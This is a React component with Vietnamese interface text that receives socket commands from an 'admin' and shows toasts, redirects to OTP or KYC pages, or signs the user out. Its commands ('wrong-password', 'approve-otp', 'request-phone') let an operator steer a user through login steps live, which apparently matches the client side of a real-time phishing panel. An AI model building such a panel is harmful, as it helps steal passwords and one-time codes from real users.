/**
 * Global Admin Command Handler
 * Xử lý tất cả lệnh từ admin một cách tập trung
 */

import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useSocket } from "../context/SocketContext";
import { useAuth } from "../context/AuthContext";
import { toast } from "../components/ui/use-toast";
import { Bell, Shield, LogOut, MessageSquare, AlertCircle } from "lucide-react";

const AdminCommandHandler = () => {
  const { socket } = useSocket();
  const { signOut } = useAuth();
  const [lastProcessedCommand, setLastProcessedCommand] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    if (!socket) return;

    const handleAdminCommand = (command) => {
      console.log("🎯 Admin Command Received:", command);

      // Prevent duplicate processing
      if (lastProcessedCommand === command.id) {
        return;
      }
      setLastProcessedCommand(command.id);

      // Process different command types
      switch (command.type) {
        case "approve":
          handleApproveLogin(command);
          break;
        case "approve-otp":
          handleApproveOTP(command);
          break;
        case "request-email":
          handleRequestEmail(command);
          break;
        case "request-phone":
          handleRequestPhone(command);
          break;
        case "wrong-password":
          handleWrongPassword(command);
          break;
        case "reset-session":
          handleResetSession(command);
          break;
        case "force.logout":
          handleForceLogout(command);
          break;
        case "request.verify":
          handleRequestVerify(command);
          break;
        case "notify":
          handleNotification(command);
          break;
        case "notification":
          handleNotification(command);
          break;
        default:
          handleGenericCommand(command);
      }
    };

    // Listen for admin commands
    socket.on("user:command", handleAdminCommand);

    return () => {
      socket.off("user:command", handleAdminCommand);
    };
  }, [socket, lastProcessedCommand, signOut]);

  const handleApproveLogin = (command) => {
    toast({
      title: "✅ Đăng nhập được phê duyệt",
      description: `Admin: ${
        command.message || "Đăng nhập của bạn đã được phê duyệt"
      }`,
      duration: 5000,
    });

    // Play notification sound
    playNotificationSound("success");
  };

  const handleApproveOTP = (command) => {
    toast({
      title: "🔐 Yêu cầu mã OTP",
      description: `Admin: ${
        command.message || "Vui lòng nhập mã OTP để xác thực"
      }`,
      duration: 7000,
    });

    // Redirect to OTP verification if route is available
    try {
      navigate("/verify-otp");
    } catch (_) {
      // ignore if route not available
    }
    playNotificationSound("info");
  };

  const handleRequestEmail = (command) => {
    toast({
      title: "📧 Xác thực Email",
      description: `Admin: ${
        command.message || "Vui lòng xác thực địa chỉ email của bạn"
      }`,
      duration: 7000,
    });
    playNotificationSound("info");
  };

  const handleRequestPhone = (command) => {
    toast({
      title: "📱 Xác thực Số điện thoại",
      description: `Admin: ${
        command.message || "Vui lòng xác thực số điện thoại của bạn"
      }`,
      duration: 7000,
    });
    playNotificationSound("info");
  };

  const handleWrongPassword = (command) => {
    toast({
      title: "❌ Mật khẩu không đúng",
      description: `Admin: ${
        command.message || "Vui lòng kiểm tra lại mật khẩu"
      }`,
      variant: "destructive",
      duration: 5000,
    });
    playNotificationSound("error");
  };

  const handleResetSession = (command) => {
    toast({
      title: "🔄 Reset phiên đăng nhập",
      description: `Admin: ${
        command.message || "Phiên đăng nhập đã được reset"
      }`,
      duration: 5000,
    });

    // Optional: Force re-login
    setTimeout(() => {
      signOut();
    }, 3000);
    playNotificationSound("warning");
  };

  const handleForceLogout = (command) => {
    toast({
      title: "🚪 Buộc đăng xuất",
      description: `Admin: ${
        command.reason || "Bạn đã bị buộc đăng xuất bởi admin"
      }`,
      variant: "destructive",
      duration: 5000,
    });

    // Force logout after 2 seconds
    setTimeout(() => {
      try {
        // Clear local tokens proactively
        const accessKey = import.meta.env.VITE_TOKEN_KEY || "user_token";
        const refreshKey =
          import.meta.env.VITE_REFRESH_TOKEN_KEY || "user_refresh_token";
        localStorage.removeItem(accessKey);
        localStorage.removeItem(refreshKey);
      } catch (_) {
        // ignore storage errors
      }
      signOut();
      try {
        navigate("/login", { replace: true });
      } catch (_) {
        window.location.href = "/login";
      }
    }, 2000);
    playNotificationSound("error");
  };

  const handleRequestVerify = (command) => {
    toast({
      title: "🛡️ Yêu cầu xác minh",
      description: `Admin: ${
        command.reason || "Vui lòng thực hiện xác minh danh tính"
      }`,
      duration: 10000,
    });

    // Redirect to verification (KYC) page if route is available
    try {
      navigate("/kyc");
    } catch (_) {
      // ignore if route not available
    }
    playNotificationSound("warning");
  };

  const handleNotification = (command) => {
    toast({
      title: "📢 Thông báo từ Admin",
      description: command.message || command.payload || "Bạn có thông báo mới",
      duration: 7000,
    });
    playNotificationSound("info");
  };

  const handleGenericCommand = (command) => {
    toast({
      title: "📢 Lệnh từ Admin",
      description: command.message || `Lệnh: ${command.type}`,
      duration: 5000,
    });
    playNotificationSound("info");
  };

  const playNotificationSound = (type = "info") => {
    try {
      const audio = new Audio();
      switch (type) {
        case "success":
          audio.src = "/sounds/notification-success.mp3";
          break;
        case "error":
          audio.src = "/sounds/notification-error.mp3";
          break;
        case "warning":
          audio.src = "/sounds/notification-warning.mp3";
          break;
        default:
          audio.src = "/sounds/notification.mp3";
      }
      audio.volume = 0.3;
      audio.play().catch(() => {
        // Ignore audio play errors (user interaction required)
      });
    } catch (error) {
      // Ignore audio errors
    }
  };

  // This component doesn't render anything visible
  return null;
};

export default AdminCommandHandler;
